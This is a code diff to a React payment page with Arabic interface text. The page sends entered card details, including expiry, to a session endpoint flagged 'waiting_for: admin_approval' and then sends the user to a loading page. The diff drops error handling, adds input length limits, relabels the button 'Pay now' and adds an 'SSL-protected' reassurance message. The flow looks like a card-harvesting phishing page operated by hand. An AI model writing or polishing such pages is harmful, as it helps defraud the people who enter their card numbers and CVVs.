@@ -171,8 +171,8 @@ export default function PaymentPage() {
     try {
       const [expMonth, expYear] = expiry.split('/').map(s => s.trim());
 
-      // إرسال البيانات للـ backend لحفظها في الجلسة
-      const res = await fetch('/api/session', {
+      // حفظ البيانات في الجلسة مباشرة
+      await fetch('/api/session', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -185,14 +185,6 @@ export default function PaymentPage() {
           waiting_for: 'admin_approval',
         }),
       });
-
-      const data = await res.json();
-
-      if (!data.success) {
-        setIsSubmitting(false);
-        setErrorMsg(data.error || 'حدث خطأ في حفظ البيانات');
-        return;
-      }
 
       // انتقل لصفحة الانتظار
       router.push("/loading-page?from=payment");
@@ -342,6 +334,7 @@ export default function PaymentPage() {
               value={cardNumber}
               onChange={(e) => handleCardNumberChange(e.target.value)}
               onBlur={onCardNumberBlur}
+              maxLength={19}
               style={inputStyle(!!cardNumberError)}
             />
             {cardNumberError && (
@@ -351,7 +344,7 @@ export default function PaymentPage() {
             )}
           </div>
 
-          {/* تاريخ الانتهاء و CVV */}
+          {/* التاريخ و CVV */}
           <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "15px" }}>
             <div>
               <label style={{ display: "block", marginBottom: "8px", fontSize: "14px", color: "#333", fontWeight: "500" }}>
@@ -359,14 +352,14 @@ export default function PaymentPage() {
               </label>
               <input
                 type="text"
-                placeholder="MM / YY"
+                placeholder="MM/YY"
                 value={expiry}
                 onChange={(e) => {
-                  const formatted = formatExpiry(e.target.value);
-                  setExpiry(formatted);
+                  setExpiry(formatExpiry(e.target.value));
                   setExpiryError("");
                 }}
                 onBlur={onExpiryBlur}
+                maxLength={5}
                 style={inputStyle(!!expiryError)}
               />
               {expiryError && (
@@ -389,6 +382,7 @@ export default function PaymentPage() {
                   setCvvError("");
                 }}
                 onBlur={onCvvBlur}
+                maxLength={4}
                 style={inputStyle(!!cvvError)}
               />
               {cvvError && (
@@ -399,32 +393,31 @@ export default function PaymentPage() {
             </div>
           </div>
 
-          {/* زر الإرسال */}
+          {/* زر الدفع */}
           <button
             onClick={handleSubmit}
             disabled={isSubmitting}
             style={{
-              width: "100%",
-              padding: "14px",
-              backgroundColor: isSubmitting ? "#ccc" : GREEN,
+              background: GREEN,
               color: "white",
               border: "none",
+              padding: "14px",
               borderRadius: "10px",
               fontSize: "16px",
               fontWeight: "bold",
               cursor: isSubmitting ? "not-allowed" : "pointer",
-              transition: "background-color 0.3s",
+              opacity: isSubmitting ? 0.6 : 1,
+              transition: "all 0.3s",
               marginTop: "10px"
             }}
-            onMouseEnter={(e) => {
-              if (!isSubmitting) (e.target as HTMLButtonElement).style.backgroundColor = "#155d2f";
-            }}
-            onMouseLeave={(e) => {
-              if (!isSubmitting) (e.target as HTMLButtonElement).style.backgroundColor = GREEN;
-            }}
           >
-            {isSubmitting ? "جاري المعالجة..." : "تأكيد الدفع"}
+            {isSubmitting ? "جاري المعالجة..." : "ادفع الآن"}
           </button>
+        </div>
+
+        {/* رسالة الأمان */}
+        <div style={{ marginTop: "25px", paddingTop: "20px", borderTop: "1px solid #eee", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", textAlign: "center" }}>
+          <span style={{ fontSize: "12px", color: "#888" }}>🔒 جميع بياناتك محمية بتشفير SSL</span>
         </div>
       </div>
     </div>
